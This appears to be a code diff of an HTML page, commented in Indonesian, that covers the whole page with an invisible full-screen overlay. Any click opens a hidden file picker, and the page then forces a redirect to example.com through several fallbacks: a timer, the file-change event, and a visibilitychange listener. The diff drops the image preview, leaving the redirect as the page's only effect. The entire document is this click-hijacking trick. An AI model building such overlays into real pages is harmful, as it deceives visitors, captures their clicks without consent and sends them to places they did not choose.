@@ -3,25 +3,20 @@
 <head>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <style>
-    body { margin: 0; font-family: sans-serif; }
+  body { margin:0; font-family:sans-serif; }
 
-    #overlay {
-        position: fixed;
-        inset: 0;
-        z-index: 9999;
-        background: rgba(0,0,0,0); /* transparan */
-        cursor: pointer;
-    }
+  #overlay {
+    position: fixed;
+    inset: 0;
+    z-index: 9999;
+    background: rgba(0,0,0,0); /* transparan */
+    cursor: pointer;
+  }
 
-    #fileInput {
-        position: absolute;
-        left: -9999px;
-    }
-
-    img {
-        width: 100%;
-        margin-top: 20px;
-    }
+  #fileInput {
+    position: absolute;
+    left: -9999px;
+  }
 </style>
 </head>
 
@@ -32,39 +27,39 @@
 <input id="fileInput" type="file" accept="image/*">
 <div id="overlay"></div>
 
-<img id="preview">
-
 <script>
 const overlay = document.getElementById("overlay");
 const fileInput = document.getElementById("fileInput");
-const preview = document.getElementById("preview");
 
-// flag supaya tidak double redirect
 let redirected = false;
 
-// trigger dari user gesture nyata
+// trigger utama (user gesture valid)
 overlay.addEventListener("click", () => {
-    fileInput.click();
+  fileInput.click();
 
-    // fallback redirect kalau user tidak pilih file
-    setTimeout(() => {
-        if (!redirected) {
-            redirected = true;
-            window.location.href = "https://example.com";
-        }
-    }, 1500);
+  // fallback kalau user tidak pilih file
+  setTimeout(() => {
+    if (!redirected) {
+      redirected = true;
+      window.location.href = "https://example.com";
+    }
+  }, 1200);
 });
 
-// jika user pilih file → redirect lebih pasti
+// kalau user pilih file → redirect pasti jalan
 fileInput.addEventListener("change", () => {
-    if (fileInput.files.length > 0) {
-        preview.src = URL.createObjectURL(fileInput.files[0]);
-    }
+  if (!redirected) {
+    redirected = true;
+    window.location.href = "https://example.com";
+  }
+});
 
-    if (!redirected) {
-        redirected = true;
-        window.location.href = "https://example.com";
-    }
+// tambahan: kalau dialog ditutup → beberapa browser trigger ini
+document.addEventListener("visibilitychange", () => {
+  if (!document.hidden && !redirected) {
+    redirected = true;
+    window.location.href = "https://example.com";
+  }
 });
 </script>
 
